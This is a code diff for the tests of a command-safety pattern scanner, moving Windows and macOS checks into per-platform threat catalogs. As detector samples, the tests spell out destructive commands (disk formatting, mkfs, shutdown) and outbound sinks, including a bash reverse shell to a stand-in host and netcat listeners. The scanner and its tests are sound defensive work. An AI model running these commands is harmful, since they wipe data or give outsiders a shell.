@@ -8,7 +8,11 @@ import {
   OUTBOUND_PATTERNS, PROTECTED_PATH_TOKENS, SECRET_REF_PATTERNS,
   SHELL_RC_TRUNCATION_PATTERNS, TRANSFORM_PATTERNS,
 } from '../lib/patterns.js'
+import { buildThreatCatalog } from '../lib/threat-catalog.js'
 import { scanViews, normalizeText } from '../lib/normalize.js'
+
+const WIN32 = buildThreatCatalog('win32')
+const DARWIN = buildThreatCatalog('darwin')
 
 // Patterns are written against NORMALIZED text (lowercase, invisible chars
 // stripped, whitespace collapsed) — the tests honor that contract.
@@ -34,22 +38,23 @@ test('patterns: head-gated high-risk terms only fire at a segment head', () => {
   // Mirror the feature-level head scan: strip leading prefix verbs (sudo/env/
   // time/command/nohup) then test the segment head against the anchored rows.
   const PREFIX = ['sudo', 'env', 'time', 'command', 'nohup', 'nice']
-  const anyHead = (text) => {
+  const headOf = (rows) => (text) => {
     let rest = normalizeText(text).trim()
     for (;;) {
       const m = /^([a-z]+)\s+/.exec(rest)
       if (m?.[1] !== undefined && PREFIX.includes(m[1])) rest = rest.slice(m[0].length).trim()
       else break
     }
-    return HIGH_RISK_HEAD_PATTERNS.some((re) => re.test(rest))
+    return rows.some((re) => re.test(rest))
   }
+  const anyHead = headOf(HIGH_RISK_HEAD_PATTERNS)
   // Real invocations MUST trip…
   assert.ok(anyHead('shutdown now'))
   assert.ok(anyHead('sudo shutdown -h now'))
   assert.ok(anyHead('reboot'))
   assert.ok(anyHead('mkfs.ext4 /dev/sda'))
-  assert.ok(anyHead('format c:'))
-  assert.ok(anyHead('diskutil eraseDisk'))
+  assert.ok(headOf(WIN32.highRiskHead)('format c:'))
+  assert.ok(headOf(DARWIN.highRiskHead)('diskutil eraseDisk'))
   assert.ok(anyHead('while true; do ls; done'))
   assert.ok(anyHead('while (1); do :; done'))
   assert.ok(anyHead('for(;;){ }'))
@@ -107,7 +112,7 @@ test('patterns: outbound sinks (echo/printf exempt by design at feature level)',
   assert.ok(hit('nc -l 4444'))
   assert.ok(hit('git push origin main'))
   assert.ok(hit('python3 -c "import socket"'))
-  assert.ok(hit('Invoke-WebRequest -Uri http://x'))
+  assert.ok(any(WIN32.outbound)('Invoke-WebRequest -Uri http://x'))
   assert.ok(hit('bash -i >& /dev/tcp/evil.x/4444 0>&1'))
   assert.ok(!hit('echo hello'))
   assert.ok(!hit('ls -la'))
